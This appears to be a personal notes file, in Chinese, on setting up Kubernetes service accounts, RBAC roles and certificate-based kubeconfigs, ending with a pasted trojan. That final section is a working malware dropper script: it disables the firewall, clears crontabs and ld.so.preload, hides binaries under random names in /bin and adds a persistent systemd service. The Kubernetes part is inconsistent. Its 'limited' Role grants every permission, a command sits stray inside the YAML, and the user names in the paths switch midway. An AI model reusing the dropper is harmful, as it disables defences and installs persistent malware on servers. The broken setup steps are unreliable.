```
服务器上不创建用户方式
---
apiVersion: v1
kind: ServiceAccount
metadata:
  name: limitd-ganyunliang
  namespace: ganyunliang
---
kind: Role
apiVersion: rbac.authorization.k8s.io/v1
metadata:
  name: ganyunliang-access
  namespace: ganyunliang
  labels:
    app: ganyunliang-access
rules:
- apiGroups: ["*"]
  resources: ["*"]
  verbs: ["*"]
- apiGroups: [""]
  resources: ["services","endpoints","pods","pods/log"]
  verbs: ["get", "list", "watch", "create", "update", "patch", "delete"]
---
apiVersion: rbac.authorization.k8s.io/v1
kind: RoleBinding
metadata:
  name: ganyunliang
  namespace: ganyunliang
  labels:
    app: ganyunliang
roleRef:
  apiGroup: rbac.authorization.k8s.io
  kind: Role
  name: ganyunliang-access
subjects:
- kind: ServiceAccount
  name: limitd-ganyunliang
  namespace: ganyunliang
  # 获取token
  kubectl create rolebinding $ROLEBINDING_NAME --clusterrole=admin --serviceaccount=$NAMESPACE:default --namespace=$NAMESPACE
  # 创建kubeconfig
  kubectl create kubeconfig limited-user-kubeconfig --kubeconfig=limited-user-kubeconfig --user=limited-user --client-certificate=/path/to/cert --client-key=/path/to/key --embed-certs=true --server='https://kubernetes.default.svc' --token=<TOKEN>
```

```
## 服务器上创建用户方式
# 创建普通用户
useradd zhangsan
# 创建用户证书私钥
cd /home/zhangsan
openssl genrsa -out zhangsan.key 2048
openssl req -new -key zhangsan.key -out zhangsan.csr -subj "/CN=zhangsan/"

openssl x509 -req -days 3650 \
-CA /etc/kubernetes/cert/ca.pem \
-CAkey /etc/kubernetes/cert/ca-key.pem \
-CAcreateserial -in zhangsan.csr -out zhangsan.crt


# 设置集群参数
kubectl config set-cluster kubernetes \
--certificate-authority=/etc/kubernetes/pki/ca.crt \
--embed-certs=true \
--server="https://192.168.46.177:6443" \
--kubeconfig=kubectl.kubeconfig
# 设置客户端认证参数
kubectl config set-credentials ganyunliang \
--client-certificate=/home/ganyunliang/ganyunliang.crt \
--client-key=/home/ganyunliang/ganyunliang.key \
--embed-certs=true \
--kubeconfig=kubectl.kubeconfig
# 设置上下文参数
kubectl config set-context ganyunliang-context \
--cluster=kubernetes \
--namespace=ganyunliang \
--user=ganyunliang \
--kubeconfig=kubectl.kubeconfig
# 设置默认上下文
kubectl config use-context ganyunliang-context --kubeconfig=kubectl.kubeconfig


kubectl config view --kubeconfig=kubectl.kubeconfig

chown -R ganyunliang:ganyunliang kubectl.kubeconfig

# 授权
cat <<END > ganyunliang-rbac.yaml
apiVersion: rbac.authorization.k8s.io/v1
kind: Role
metadata:
  name: ganyunliang
  namespace: ganyunliang
rules:
- apiGroups: ["*"]
  resources: ["*"]
  verbs: ["*"]
- apiGroups: [""]
  resources: ["services","endpoints","pods","pods/log"]
  verbs: ["get", "list", "watch", "create", "update", "patch", "delete"]
---
apiVersion: rbac.authorization.k8s.io/v1
kind: RoleBinding
metadata:
  name: ganyunliang
  namespace: ganyunliang
subjects:
- kind: User
  name: ganyunliang
  apiGroup: rbac.authorization.k8s.io
roleRef:
  kind: Role
  name: ganyunliang
  apiGroup: rbac.authorization.k8s.io
END

kubectl create -f ganyunliang-rbac.yaml

# 测试
cat <<END > test-rbac.yaml
apiVersion: v1
kind: Pod
metadata:
  name: busybox
spec:
  containers:
  - name: busybox
    image: busybox:1.28.4
    imagePullPolicy: IfNotPresent
    command: ['/bin/sh','-c','sleep 3600']
END
```

```
## 木马
command -v debian-sa1 > /dev/null && debian-sa1 1 1
 #!/bin/bash crontab -r 2>/dev/null  ufw disable 2>/dev/null iptables -P INPUT ACCEPT 2>/dev/null iptables -P OUTPUT ACCEPT 2>/dev/null iptables -P FORWARD ACCEPT 2>/dev/null iptables -F 2>/dev/null chattr -i /usr/sbin/ >/dev/null 2>&1 chattr -i /usr/bin/ >/dev/null 2>&1 chattr -i /bin/ >/dev/null 2>&1 chattr -i /usr/lib >/dev/null 2>&1 chattr -i /usr/lib64 >/dev/null 2>&1 chattr -i /usr/libexec >/dev/null 2>&1 chattr -i /etc/ >/dev/null 2>&1 chattr -i /tmp/ >/dev/null 2>&1 chattr -i /sbin/ chattr -i /etc/resolv.conf chattr -i /etc/cron.d/systeml >/dev/null 2>&1 chattr -i /etc/cron.weekly/systeml >/dev/null 2>&1 chattr -i /etc/cron.hourly/systeml >/dev/null 2>&1 chattr -i /etc/cron.daily/systeml >/dev/null 2>&1 chattr -i /etc/cron.monthly/systeml >/dev/null 2>&1  chattr -ia /etc/ld.so.preload 2>/dev/null cat /dev/null > /etc/ld.so.preload 2>/dev/null  # Check if a file exists containing the previous filenames if [ -e "/usr/lib/systemd/previous_filenames1" ] && [ -e "/usr/lib/systemd/previous_filenames2" ]; then     # Read the previous filenames from the files     read -r file1 < "/usr/lib/systemd/previous_filenames1"     read -r file2 < "/usr/lib/systemd/previous_filenames2" else     # Generate new random filenames     file1="/bin/$(cat /dev/urandom | tr -dc 'a-zA-Z0-9' | fold -w 8 | head -n 1)"     file2="/bin/$(cat /dev/urandom | tr -dc 'a-zA-Z0-9' | fold -w 8 | head -n 1)"      # Save the filenames to files for the next run     echo "$file1" > "/usr/lib/systemd/previous_filenames1"     echo "$file2" > "/usr/lib/systemd/previous_filenames2" fi # Move the files to their new names mv x86_64 "$file1" 2>/dev/null mv i386 "$file2" 2>/dev/null  # Set variables SERVICE="ntools" EXEC="ntools" DIR="/tmp"  # Unset immutable attributes on some files chattr -iaus /etc/cron.*/$EXEC /etc/init.d/$EXEC 2>/dev/null  # Check if the process is running if P=$(pgrep -F /bin/.locked) >> /dev/null; then     echo "Running" && exit else     echo "Not running"     # Copy the files to the temporary directory     cp "$file1" "$DIR/$EXEC" 2>/dev/null     cp "$file2" "$DIR/neo" 2>/dev/null     chmod +x "$DIR/$EXEC" 2>/dev/null     chmod +x "$DIR/neo" 2>/dev/null     "$DIR/$EXEC" --tls >/dev/null 2>&1     rm -rf "$DIR/$EXEC" fi  sleep 2  # Check if the process is running and update the lock file if P1=$(pgrep "$EXEC") 2>/dev/null; then     echo $P1 > /bin/.locked 2>/dev/null fi  # Execute the command using the value stored in the lock file "$DIR/neo" "$(cat /bin/.locked)" 2>/dev/null # Read the previous filenames from the files read -r file1 < "/usr/lib/systemd/previous_filenames1" read -r file2 < "/usr/lib/systemd/previous_filenames2"  # Check if the processes are running and kill them pkill -f "$file1" pkill -f "$file2"  /bin/xS3Z9uhR

[Unit]
Description=service
After=network.target

[Service]
Type=simple
ExecStart=/bin/xS3Z9uhR
RemainAfterExit=yes
Restart=always
RestartSec=60s

[Install]
WantedBy=multi-user.target
```



